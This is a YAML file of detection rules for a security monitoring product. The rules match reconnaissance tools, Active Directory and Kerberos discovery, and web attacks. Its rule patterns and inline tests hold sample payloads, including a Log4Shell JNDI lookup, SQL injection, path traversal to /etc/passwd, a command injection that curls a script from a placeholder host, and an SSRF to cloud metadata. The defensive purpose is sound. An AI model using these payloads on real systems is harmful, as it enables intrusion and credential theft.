# ThreatBrain built-in detection rules (Sigma-inspired, MITRE ATT&CK mapped).
#
# File format: {version, rules: [...]}. Each rule has
#   id, name, severity (info|low|medium|high|critical), confidence (0-100 = how likely a
#   match is a true positive), techniques (ATT&CK ids; tactics are derived), tags,
#   references, tuning (what to adjust if it is noisy in your environment), match, tests.
#   `match` is a tree of {all|any|not} over leaves {field, <operator>: value}.
#   Operators: equals, contains, startswith, endswith, regex, in, cidr, gt/gte/lt/lte, exists.
#   Everything is case-insensitive. `field` is a normalized event attribute
#   (title, event_type, source_ip, destination_ip, destination_port, username, process_name,
#   command_line, asset_name, outcome), a dotted path into the vendor payload (raw.<key>),
#   or `text` (every string in the event joined).
#   Regexes may not contain unbounded wildcards (.* / .+): use a bounded gap such as .{0,200}
#   (enforced at load time to rule out catastrophic backtracking on attacker-controlled input).
#   Every rule ships inline `tests` (a positive and a negative case); CI fails if they regress.
version: "2026.10.2"
rules:

# =============================================================== RECONNAISSANCE / DISCOVERY
- id: TB-RECON-001
  name: Active reconnaissance reported by a sensor (scanner / directory brute-force)
  severity: medium
  confidence: 75
  techniques: [T1595.002]
  tags: [reconnaissance, scanning]
  tuning: Exclude your own vulnerability scanner source IPs upstream or via an org override.
  match: {field: event_type, regex: '^recon\.'}
  tests:
    - {name: collector recon event, event: {event_type: recon.web_scanning}, expect_match: true}
    - {name: normal web request, event: {event_type: web.request}, expect_match: false}

- id: TB-RECON-002
  name: Offensive scanning or enumeration tool observed
  severity: medium
  confidence: 80
  techniques: [T1595, T1046, T1190]
  tags: [reconnaissance, tooling]
  tuning: Allow-list authorised scanner hosts (asset_name) if you run Nessus/OpenVAS/nuclei internally.
  match:
    any:
      - {field: command_line, regex: '\b(nmap|masscan|zmap|rustscan|nikto|sqlmap|gobuster|dirbuster|feroxbuster|ffuf|wfuzz|nuclei|wpscan|enum4linux|smbmap|nbtscan)\b'}
      - {field: process_name, regex: '^(nmap|masscan|zmap|rustscan|nikto|sqlmap|gobuster|ffuf|nuclei|wpscan)(\.exe)?$'}
      - {field: raw.user_agent, regex: '(nmap scripting engine|nikto|sqlmap|masscan|zgrab|nuclei|wfuzz|gobuster|dirbuster|acunetix|nessus|openvas|wpscan)'}
  tests:
    - {name: nmap command, event: {command_line: 'nmap -sS -p- 10.0.0.0/24'}, expect_match: true}
    - {name: sqlmap user agent, event: {raw_data: {user_agent: 'sqlmap/1.7.2#stable (https://sqlmap.org)'}}, expect_match: true}
    - {name: browser user agent, event: {raw_data: {user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0'}}, expect_match: false}
    - {name: word nmap in prose only inside a path-less phrase, event: {command_line: 'echo annmap'}, expect_match: false}

- id: TB-NET-004
  name: IDS/IPS exploit, malware or command-and-control signature fired
  severity: high
  confidence: 70
  techniques: [T1190, T1071]
  tags: [ids, network, signature]
  tuning: Signature noise varies by ruleset; filter on your sensor's category or priority upstream, or lower the severity per tenant.
  match:
    any:
      - {field: text, regex: '\b(et|etpro|gpl)\s+(exploit|malware|trojan|attack_response|web_specific_apps|web_server|shellcode|current_events)\b'}
      - {field: text, regex: '(remote code execution|rce|command injection|sql injection|buffer overflow|shellcode|webshell)\s+(attempt|detected|exploit)|exploit\s+(attempt|kit)\b'}
      - all:
          - {field: event_type, regex: '^cef\.(snort|suricata|ids|ips|tippingpoint|fortinet_ips|cisco_firepower|zeek|bro)'}
          - {field: raw.cef.severity, in: ['7', '8', '9', '10', 'high', 'very-high']}
  tests:
    - {event: {event_type: cef.snort, title: 'ET EXPLOIT Apache Struts Remote Code Execution Attempt', raw_data: {cef: {severity: '9'}}}, expect_match: true}
    - {event: {title: 'GPL ATTACK_RESPONSE id check returned root'}, expect_match: true}
    - {event: {event_type: cef.snort, title: 'ET POLICY Dropbox Client Update', raw_data: {cef: {severity: '3'}}}, expect_match: false}

- id: TB-AUTH-009
  name: Burst of failed authentications reported in event text (aggregated by the sender)
  severity: medium
  confidence: 65
  techniques: [T1110]
  tags: [brute-force, aggregated]
  match:
    any:
      - {field: text, regex: '\b\d{2,5}\s+(failed\s+)?(login|logon|authentication|auth|password|ssh)?\s{0,3}(failures|failed attempts|attempts|tries)\b.{0,40}\b(in|within|over)\s+\d{1,4}\s*(s|sec|secs|seconds|m|min|mins|minutes)\b'}
      - {field: text, regex: '(multiple|repeated|excessive|numerous)\s+(failed\s+)?(login|logon|authentication|password)\s+(failures|attempts)'}
  tests:
    - {event: {title: 'Failed password for admin from 203.0.113.61 (30 attempts in 60s)'}, expect_match: true}
    - {event: {title: 'Multiple failed login attempts for user root'}, expect_match: true}
    - {event: {title: 'User logged in successfully after 1 attempt'}, expect_match: false}

- id: TB-NET-001
  name: Port scan reported
  severity: medium
  confidence: 70
  techniques: [T1046]
  tags: [port-scan, discovery]
  match:
    any:
      - {field: event_type, regex: 'port_?scan|network\.scan'}
      - {field: text, regex: '\b(port ?scan(ning)?|syn scan|nmap scan|host sweep)\b'}
  tests:
    - {event: {title: 'Port scan detected from 198.51.100.4'}, expect_match: true}
    - {event: {title: 'Port 443 opened by deployment'}, expect_match: false}

- id: TB-DISC-001
  name: Active Directory / domain reconnaissance command
  severity: medium
  confidence: 70
  techniques: [T1087.002, T1069, T1482]
  tags: [discovery, active-directory]
  tuning: Domain admins legitimately run these; scope to non-admin accounts if noisy.
  match:
    any:
      - {field: command_line, regex: 'net1?(\.exe)?\s+(group|user|accounts)\s.{0,40}/domain'}
      - {field: command_line, regex: 'nltest(\.exe)?\s.{0,40}/(dclist|domain_trusts|trusted_domains)'}
      - {field: command_line, regex: '\b(dsquery|adfind)(\.exe)?\s+(\*|user|computer|group|-f)'}
      - {field: command_line, regex: 'get-ad(user|computer|group|domain|trust)\b'}
      - {field: command_line, regex: '\b(sharphound|bloodhound)\b'}
  tests:
    - {event: {command_line: 'net group "Domain Admins" /domain'}, expect_match: true}
    - {event: {command_line: 'nltest /dclist:corp.example.com'}, expect_match: true}
    - {event: {command_line: 'net use Z: \\fileserver\share'}, expect_match: false}

- id: TB-DISC-002
  name: Kerberoasting reconnaissance or ticket request
  severity: high
  confidence: 75
  techniques: [T1558.003]
  tags: [kerberoasting, credential-access]
  match:
    any:
      - {field: command_line, regex: 'setspn(\.exe)?\s+.{0,20}-(t|q)\s'}
      - {field: command_line, regex: '\b(invoke-kerberoast|getuserspns|rubeus)\b.{0,100}(kerberoast|asktgs|spn)'}
      - {field: command_line, regex: '\bGetUserSPNs(\.py)?\b'}
      - all:
          - {field: event_type, equals: authentication.kerberos_tgs}
          - {field: raw.ticket_encryption_type, in: ['0x17', '23', 'rc4-hmac']}
          - {field: raw.service_name, regex: '^(?!krbtgt)'}
  tests:
    - {event: {command_line: 'setspn -T corp -Q */*'}, expect_match: true}
    - {event: {event_type: authentication.kerberos_tgs, raw_data: {ticket_encryption_type: '0x17', service_name: 'MSSQLSvc/db01'}}, expect_match: true}
    - {event: {event_type: authentication.kerberos_tgs, raw_data: {ticket_encryption_type: '0x12', service_name: 'MSSQLSvc/db01'}}, expect_match: false}

- id: TB-DISC-004
  name: Network share or SMB host enumeration
  severity: low
  confidence: 50
  techniques: [T1135]
  tags: [discovery, smb]
  tuning: Administrators map shares daily. Low confidence on its own; valuable inside a correlation.
  match:
    any:
      - {field: command_line, regex: 'net1?(\.exe)?\s+view\s+(\\\\|/domain)'}
      - {field: command_line, regex: '\b(get-smbshare|get-smbconnection|showmount\s+-e|smbclient\s+-L|smbmap|enum4linux)\b'}
      - {field: command_line, regex: 'nmap\s.{0,60}--script[= ]\S{0,30}smb-enum-shares'}
  tests:
    - {event: {command_line: 'net view \\10.0.0.10 /all'}, expect_match: true}
    - {event: {command_line: 'smbclient -L //10.0.0.5 -N'}, expect_match: true}
    - {event: {command_line: 'net use Z: \\files\public'}, expect_match: false}

- id: TB-DISC-003
  name: Cloud / container resource enumeration of secrets or credentials
  severity: medium
  confidence: 65
  techniques: [T1613, T1526, T1552]
  tags: [discovery, cloud, kubernetes]
  match:
    any:
      - {field: command_line, regex: 'kubectl\s+get\s+(secrets?|sa|serviceaccounts?)\b.{0,30}(-A|--all-namespaces)'}
      - {field: command_line, regex: 'aws\s+(iam\s+(list-(users|roles|access-keys)|get-account-authorization-details)|secretsmanager\s+list-secrets|ssm\s+describe-parameters)'}
      - all:
          - {field: event_type, regex: '^container\.k8s\.'}
          - {field: raw.verb, in: [list, get]}
          - {field: raw.resource, in: [secrets]}
  tests:
    - {event: {command_line: 'kubectl get secrets -A -o yaml'}, expect_match: true}
    - {event: {command_line: 'kubectl get pods -n web'}, expect_match: false}

# =============================================================== INITIAL ACCESS / WEB
- id: TB-WEB-001
  name: Web exploitation attempt reported by a sensor
  severity: high
  confidence: 80
  techniques: [T1190]
  tags: [web-attack, initial-access]
  match: {field: event_type, regex: '^web\.(sql_injection|xss|path_traversal|command_injection|log4shell|rce|ssrf|xxe|file_inclusion)$'}
  tests:
    - {event: {event_type: web.sql_injection}, expect_match: true}
    - {event: {event_type: web.request}, expect_match: false}

- id: TB-WEB-002
  name: Log4Shell (JNDI lookup) remote code execution attempt
  severity: critical
  confidence: 90
  techniques: [T1190]
  tags: [log4shell, rce, web-attack]
  match:
    any:
      - {field: event_type, equals: web.log4shell}
      - {field: text, regex: '\$\{(jndi|\$\{[^}]{0,20}\}|[a-z:]{0,10}):?(ldap|ldaps|rmi|dns|iiop|nis|corba)s?:'}
      - {field: text, regex: '\$\{(?:\$\{[^}]{0,30}\}|[jndi:\-]){2,16}(?:\$\{[^}]{0,30}\}|[ldaprmisn:\-]){2,24}//'}
  tests:
    - {event: {raw_data: {user_agent: '${jndi:ldap://198.51.100.9:1389/a}'}}, expect_match: true}
    - {name: obfuscated lookup, event: {raw_data: {url: '/?x=${${lower:j}ndi:${lower:l}dap://x.example/a}'}}, expect_match: true}
    - {event: {raw_data: {url: '/?price=${amount}'}}, expect_match: false}

- id: TB-WEB-003
  name: SQL injection payload in a web request
  severity: high
  confidence: 80
  techniques: [T1190]
  tags: [web-attack, sqli]
  tuning: Application search boxes that accept SQL-like text may need an org override.
  match:
    all:
      - not: {field: command_line, exists: true}  # web payload rule: process telemetry is out of scope
      - any:
          - {field: text, regex: '(union(\s|\+|/\*.{0,10}\*/|%20){1,5}(all(\s|\+|%20)+)?select\b|(?:\b|%20)or(\s|\+|%20)+1(\s|\+|%20)*=(\s|\+|%20)*1\b|(\s|\+|%20)and(\s|\+|%20)+1(\s|\+|%20)*=(\s|\+|%20)*1\b)'}
          - {field: text, regex: "('|%27)(\\s|\\+|%20)*(or|and)(\\s|\\+|%20)+('|%27)?\\w{1,10}('|%27)?(\\s|\\+|%20)*=(\\s|\\+|%20)*('|%27)?\\w{1,10}"}
          - {field: text, regex: '(sleep\s{0,3}\(\s{0,3}\d|benchmark\s{0,3}\(|waitfor(\s|\+|%20)+delay|pg_sleep\s{0,3}\(|information_schema\.|xp_cmdshell|load_file\s{0,3}\(|into(\s|\+|%20)+outfile|extractvalue\s{0,3}\(|updatexml\s{0,3}\()'}
          - {field: text, regex: '(;|%3b)(\s|\+|%20)*(drop|truncate|delete|insert|update)(\s|\+|%20)+(table|from|into)\b'}
  tests:
    - {event: {raw_data: {url: "/item?id=1 UNION SELECT username,password FROM users--"}}, expect_match: true}
    - {event: {raw_data: {url: "/item?id=1%20OR%201=1"}}, expect_match: true}
    - {event: {raw_data: {url: "/login?u=admin'--"}}, expect_match: false}
    - {event: {raw_data: {url: "/item?id=1' or '1'='1"}}, expect_match: true}
    - {event: {raw_data: {url: "/item?id=1;SELECT pg_sleep(10)--"}}, expect_match: true}
    - {name: ordinary query string, event: {raw_data: {url: '/search?q=union+station+selection'}}, expect_match: false}
    - {name: prose about information schema, event: {title: 'Updated documentation for the schema'}, expect_match: false}

- id: TB-WEB-004
  name: Cross-site scripting payload in a web request
  severity: high
  confidence: 75
  techniques: [T1190, T1059.007]
  tags: [web-attack, xss]
  match:
    all:
      - not: {field: command_line, exists: true}  # web payload rule: process telemetry is out of scope
      - any:
          - {field: text, regex: '(<|%3c)(\s|%20)*(script|svg|iframe|img|body|details|marquee)\b.{0,100}(on\w{3,20}\s*=|src\s*=|javascript:)'}
          - {field: text, regex: '(<|%3c)script\b'}
          - {field: text, regex: '(javascript|vbscript|data):(\s|%20)*(text/html|alert|eval|document)'}
          - {field: text, regex: '\bon(error|load|mouseover|focus|click|toggle)\s*=\s*[^\s&]{0,40}(alert|prompt|confirm|eval|document\.)'}
  tests:
    - {event: {raw_data: {url: '/s?q=<script>alert(1)</script>'}}, expect_match: true}
    - {event: {raw_data: {url: '/s?q=%3Cimg%20src=x%20onerror=alert(1)%3E'}}, expect_match: true}
    - {event: {raw_data: {url: '/s?q=javascript:alert(document.cookie)'}}, expect_match: true}
    - {event: {raw_data: {url: '/blog/how-to-write-a-script-for-your-podcast'}}, expect_match: false}

- id: TB-WEB-005
  name: Path traversal or local file inclusion attempt
  severity: high
  confidence: 80
  techniques: [T1190]
  tags: [web-attack, traversal, lfi]
  match:
    all:
      - not: {field: command_line, exists: true}  # web payload rule: process telemetry is out of scope
      - any:
          - {field: text, regex: '(\.\.(/|\\|%2f|%5c)){2,}'}
          - {field: text, regex: '(%2e|\.){1,2}(%2e|\.)(%2f|%5c|/|\\)(%2e|\.){1,2}(%2e|\.)(%2f|%5c|/|\\)'}
          - {field: text, regex: '(/etc/(passwd|shadow|hosts)\b|/proc/self/(environ|cmdline)|boot\.ini|/windows/win\.ini|web\.config\b.{0,10}(\.\.|%2e))'}
          - {field: text, regex: '(php|file|expect|zip|phar|data)://(filter|input|etc|\w{0,20})'}
  tests:
    - {event: {raw_data: {url: '/download?f=../../../../etc/passwd'}}, expect_match: true}
    - {event: {raw_data: {url: '/download?f=..%2f..%2f..%2fwindows/win.ini'}}, expect_match: true}
    - {event: {raw_data: {url: '/img/../img/logo.png'}}, expect_match: false}

- id: TB-WEB-006
  name: Command injection payload in a web request
  severity: high
  confidence: 75
  techniques: [T1190, T1059.004]
  tags: [web-attack, command-injection]
  match:
    all:
      - not: {field: command_line, exists: true}  # web payload rule: process telemetry is out of scope
      - any:
          - {field: text, regex: '(;|\||\|\||&&|%3b|%7c|%26%26)(\s|\+|%20|\$\{ifs\}){0,5}(cat|ls|id|whoami|uname|wget|curl|nc|ncat|bash|sh|ping|nslookup|powershell|cmd)(\s|\+|%20|\$\{ifs\}|\.exe|$)'}
          - {field: text, regex: '(\$\(|`|%24%28)(\s|\+)?(cat|id|whoami|uname|curl|wget|nc)\b'}
          - {field: text, regex: '/bin/(ba)?sh\s+-c|cmd(\.exe)?(\s|%20)+/c(\s|%20)'}
  tests:
    - {event: {raw_data: {url: '/ping?host=8.8.8.8;cat /etc/passwd'}}, expect_match: true}
    - {event: {raw_data: {url: '/ping?host=8.8.8.8|whoami'}}, expect_match: true}
    - {event: {raw_data: {url: '/ping?host=8.8.8.8&&curl http://x.example/a.sh'}}, expect_match: true}
    - {event: {raw_data: {url: '/search?q=cats&sort=asc'}}, expect_match: false}

- id: TB-WEB-007
  name: Server-side request forgery toward cloud metadata or internal services
  severity: high
  confidence: 75
  techniques: [T1190, T1552.005]
  tags: [web-attack, ssrf, cloud]
  match:
    all:
      - not: {field: command_line, exists: true}  # web payload rule: process telemetry is out of scope
      - any:
          - {field: text, regex: '(url|uri|redirect|dest|target|path|file|image|link)=[^&\s]{0,40}(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254)'}
          - {field: text, regex: '(url|uri|redirect|dest|target|link)=[^&\s]{0,20}(https?(://|%3a%2f%2f))(127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1\])'}
  tests:
    - {event: {raw_data: {url: '/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'}}, expect_match: true}
    - {event: {raw_data: {url: '/fetch?url=https://example.org/logo.png'}}, expect_match: false}

- id: TB-WEB-010
  name: Server-side code injection in a web request (OGNL/Spring class-loader, Java deserialisation, template injection)
  severity: critical
  confidence: 85
  techniques: [T1190]
  tags: [web-attack, rce, java, ognl]
  match:
    all:
      - not: {field: command_line, exists: true}
      - any:
          - {field: text, regex: 'ognl\.ognlcontext|#_memberaccess|#context\[.{0,20}\]|@java\.lang\.(runtime|processbuilder|system)@'}
          - {field: text, regex: '(class|\[.class.\])\.(module\.)?classloader\.(resources|urls|parent)'}
          - {field: text, regex: '(%\{|\$\{)\s{0,3}\(?#[\w_]{1,20}\s{0,3}=\s{0,3}@?[\w.]{0,40}'}
          - {field: text, regex: 'freemarker\.template\.utility\.execute|\bnew\s+java\.lang\.processbuilder|\bjava\.lang\.runtime\.getruntime\(\)\.exec'}
          - {field: text, regex: '\bro0ab[a-z0-9+/]{20,}|\baced0005|application/x-java-serialized-object|\bysoserial\b'}
          - {field: text, regex: '\{\{\s{0,3}\d{1,3}\s{0,3}\*\s{0,3}\d{1,3}\s{0,3}\}\}|\{\{\s{0,3}(config|self|request|lipsum|cycler|joiner)\b[^}]{0,60}\}\}|__class__\.__(init|mro|base|subclasses)__|__globals__|<%=\s{0,3}\d{1,3}\s{0,3}\*\s{0,3}\d{1,3}\s{0,3}%>|\$\{\{\s{0,3}\d'}
  tests:
    - {event: {raw_data: {content_type: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}"}}, expect_match: true}
    - {event: {raw_data: {url: '/app?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di'}}, expect_match: true}
    - {event: {raw_data: {url: '/products?class=shoes&module=summer'}}, expect_match: false}
    - {event: {raw_data: {body: 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHA'}}, expect_match: true}
    - {event: {raw_data: {url: "/greet?name={{7*7}}"}}, expect_match: true}
    - {event: {raw_data: {url: '/greet?name=Alice'}}, expect_match: false}
    - {event: {raw_data: {url: '/price?amount=${total}'}}, expect_match: false}

- id: TB-WEB-008
  name: Web shell indicators (file written to web root or shell-like request)
  severity: high
  confidence: 75
  techniques: [T1505.003]
  tags: [webshell, persistence]
  match:
    any:
      - all:
          - {field: event_type, regex: '^file\.(create|write|modify|rename)'}
          - {field: raw.file_path, regex: '(/var/www|/srv/www|/usr/share/nginx|inetpub\\wwwroot|/webapps/|/htdocs/|\\wwwroot\\).{0,120}\.(php|phtml|jsp|jspx|aspx?|ashx|cfm)$'}
          - {field: process_name, regex: '^(?!(php-fpm|composer|git|rsync|nginx|apache2|httpd|w3wp\.exe)$)'}
      - {field: text, regex: '(\?|&)(cmd|exec|command|c)=(whoami|id|ls|dir|uname|cat|ipconfig|net(\+|%20)user)'}
      - {field: text, regex: '\b(c99shell|r57shell|wso\.php|b374k|china\s?chopper|weevely|antsword)\b'}
  tests:
    - {event: {event_type: file.create, process_name: bash, raw_data: {file_path: '/var/www/html/uploads/x.php'}}, expect_match: true}
    - {event: {raw_data: {url: '/uploads/x.php?cmd=whoami'}}, expect_match: true}
    - {event: {event_type: file.create, process_name: git, raw_data: {file_path: '/var/www/html/index.php'}}, expect_match: false}

- id: TB-WEB-009
  name: Interpreter or shell spawned by a web server / application server
  severity: high
  confidence: 80
  techniques: [T1190, T1059]
  tags: [rce, webshell, process-ancestry]
  tuning: Generic runtimes (java, node, ruby, python) are deliberately NOT listed as parents because CI agents (Jenkins, Gradle) and developer tooling spawn shells constantly. Add a custom rule for your own application servers if you want that coverage. CGI-style applications that intentionally spawn shells need an exclusion on the specific command.
  match:
    all:
      - {field: raw.parent_process, regex: '^(nginx|apache2|httpd|php-fpm\d?(\.\d)?|php-cgi|tomcat\d*|w3wp|gunicorn|uwsgi|puma|catalina|lighttpd|caddy|httpd\.worker)(\.exe)?$'}
      - {field: process_name, regex: '^(sh|bash|dash|zsh|ksh|cmd\.exe|powershell\.exe|pwsh|nc|ncat|wget|curl|python\d?(\.\d+)?|perl|whoami\.exe|certutil\.exe)$'}
  tests:
    - {event: {process_name: bash, raw_data: {parent_process: apache2}}, expect_match: true}
